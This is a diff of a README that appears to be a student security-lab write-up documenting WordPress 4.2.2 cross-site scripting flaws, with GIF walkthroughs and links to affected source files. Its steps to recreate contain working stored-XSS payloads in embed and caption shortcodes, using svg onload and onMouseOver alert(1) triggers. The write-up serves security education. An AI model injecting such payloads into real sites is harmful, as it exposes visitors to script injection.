@@ -22,17 +22,17 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.7.3
   - [ ] GIF Walkthrough: ![Lab8_Chal2](https://user-images.githubusercontent.com/32075350/55766014-9a05f800-5a40-11e9-980e-ceba61acdfc6.gif)
   - [ ] Steps to recreate: Simply type the following text into a post: [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
   - [ ] Affected source code: media.php
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.2/src/wp-includes/media.php)
+1. (Required) Vulnerability Name or ID: WordPress <= 4.3 – Authenticated Shortcode Tags Cross-Site Scripting (XSS)
+  - [ ] Summary: This explot basically outputs a text and when the user hovers his/her mouse over the text/letters the exploit is triggered
+    - Vulnerability types: Cross-Site Scripting (XSS)
+    - Tested in version:4.2.2
+    - Fixed in version: 4.3.1
+  - [ ] GIF Walkthrough: ![Lab8_Chal3](https://user-images.githubusercontent.com/32075350/55766566-33360e00-5a43-11e9-8bee-b3943d9e98c3.gif)
+  - [ ] Steps to recreate: To recreate this simply type the following text in a post and upload: TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Hack Me</a>
+  - [ ] Affected source code: shortcodes.php
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.2/src/wp-includes/shortcodes.php)
 1. (Optional) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
